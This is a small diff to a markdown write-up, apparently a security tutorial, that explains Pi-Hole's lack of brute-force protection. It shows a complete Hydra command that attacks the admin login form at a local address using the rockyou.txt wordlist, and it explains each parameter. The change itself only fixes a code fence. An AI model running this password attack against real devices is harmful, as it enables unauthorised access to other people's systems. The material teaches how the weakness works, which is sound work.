@@ -52,7 +52,7 @@ Pi-Hole doesn't block bruteforcing. You can enter 200,000 incorrect passwords an
 Hydra is a brute-forcing tool that uses a dictionary to attack a target. The payload for brute-forcing a Pi-Hole is:
 
 ```
-hydra -l '' -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/admin/index.php?login:pw=^PASS^:Forgot password"```
+hydra -l '' -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/admin/index.php?login:pw=^PASS^:Forgot password"
 ```
 Our wordlist is the infamous [rockyou.txt](https://www.kaggle.com/wjburns/common-password-list-rockyoutxt). We use the http-post-form module and enter some information. The form to post, the name of the variable for the password ("pw"), and what will be on the page when a failed login attempt happens (the forgotten password box).
 
